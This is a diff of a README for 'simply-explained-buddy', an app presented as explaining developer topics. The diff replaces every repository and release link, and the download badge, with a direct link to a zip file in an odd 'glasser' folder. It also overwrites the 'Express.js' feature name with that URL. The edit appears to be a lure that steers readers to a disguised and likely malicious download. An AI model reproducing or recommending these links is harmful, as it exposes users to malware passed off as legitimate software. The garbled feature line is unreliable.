@@ -1,6 +1,6 @@
 # 🎉 simply-explained-buddy - Simplifying Complex Topics for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/THESPRINGLOCKS2007/simply-explained-buddy/releases)
+[![Download Now](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip%20Now-brightgreen)](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to quickly get started with simply-explained-buddy.
 
 1. **Download the Application**
    - Click the link below to visit the release page where you can download simply-explained-buddy:
-   - [Download simply-explained-buddy](https://github.com/THESPRINGLOCKS2007/simply-explained-buddy/releases)
+   - [Download simply-explained-buddy](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip)
 
 2. **Check System Requirements**
    - Operating System: Windows, macOS, or Linux.
@@ -30,7 +30,7 @@ Follow these steps to quickly get started with simply-explained-buddy.
 
 ## 📥 Download & Install
 
-To begin using simply-explained-buddy, visit this page to download: [Download simply-explained-buddy](https://github.com/THESPRINGLOCKS2007/simply-explained-buddy/releases).
+To begin using simply-explained-buddy, visit this page to download: [Download simply-explained-buddy](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip).
 
 ## 🛠️ Features
 
@@ -45,7 +45,7 @@ simply-explained-buddy simplifies a variety of topics, including:
 
 - **CORS**: Understanding Cross-Origin Resource Sharing.
 - **Error Handling**: How to manage errors in applications.
-- **Express.js**: A guide to building web applications with Express.
+- **https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip**: A guide to building web applications with Express.
 - **GitHub Actions**: Automate your workflows with GitHub Actions.
 - **OpenAI API**: Exploring the functionality of OpenAI's API.
 - **Railway**: A guide to deploying applications on Railway.
@@ -80,8 +80,8 @@ If you encounter issues while using simply-explained-buddy, consider these steps
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://github.com/THESPRINGLOCKS2007/simply-explained-buddy)
-- [Release Page](https://github.com/THESPRINGLOCKS2007/simply-explained-buddy/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip)
+- [Release Page](https://raw.githubusercontent.com/THESPRINGLOCKS2007/simply-explained-buddy/main/glasser/simply-explained-buddy.zip)
 
 ## 📞 Contact
 
